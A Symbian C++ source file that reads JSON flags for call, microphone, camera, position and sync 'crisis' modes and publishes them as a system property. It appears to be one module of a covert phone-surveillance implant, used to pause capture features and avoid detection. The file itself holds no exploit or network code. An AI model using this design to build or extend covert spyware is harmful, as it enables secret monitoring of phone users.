/*
 * AgentCrisis.cpp
 *
 *  Created on: 01/giu/2012
 *      Author: Giovanna
 */

#include "AgentCrisis.h"
#include "Json.h"


CAgentPanic::CAgentPanic() :
	CAbstractAgent(EAgent_Crisis),iBusy(EFalse)
	{
	// No implementation required
	}

CAgentPanic::~CAgentPanic()
	{
	__FLOG(_L("Destructor"));
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentPanic* CAgentPanic::NewLC(const TDesC8& params)
	{
	CAgentPanic* self = new (ELeave) CAgentPanic();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentPanic* CAgentPanic::NewL(const TDesC8& params)
	{
	CAgentPanic* self = CAgentPanic::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentPanic::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	__FLOG_OPEN("HT", "Agent_Crisis.txt");
	__FLOG(_L("-------------"));
	
	//read parameters
	RBuf paramsBuf;
					
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else 
		{
			//TODO: not enough memory
		}
				
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		TBool activated;
		//retrieve call flag
		if(rootObject->Find(_L("call")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("call"),activated);
			if (activated)
				iFlags |= ECallCrisis;
			}
		//retrieve mic flag
		if(rootObject->Find(_L("mic")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("mic"), activated);
			if (activated)
				iFlags |= EMicCrisis;
			}
		//retrieve camera flag
		if(rootObject->Find(_L("camera")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("camera"), activated);
			if(activated)
				iFlags |= ECamCrisis;
			}
		//retrieve position flag
		if(rootObject->Find(_L("position")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("position"), activated);
			if(activated)
				iFlags |= EPosCrisis;
			}
		//retrieve sync flag
		if(rootObject->Find(_L("synchronize")) != KErrNotFound)
			{
			rootObject->GetBoolL(_L("synchronize"), activated);
			if(activated)
				iFlags |= ESyncCrisis;
			}
		
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	
	}

void CAgentPanic::StartAgentCmdL()
	{
	
	__FLOG(_L("StartAgentCmdL()"));
	if(iBusy)
		return;
	iBusy = ETrue;
	RProperty::Set(KPropertyUidCore, KPropertyCrisis,iFlags);
	iBusy = EFalse;
	}

void CAgentPanic::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
	RProperty::Set(KPropertyUidCore, KPropertyCrisis,0);
	iBusy = EFalse;
	}

void CAgentPanic::CycleAgentCmdL()
	{
	//nothing to be done, this is not an appending agent
	}

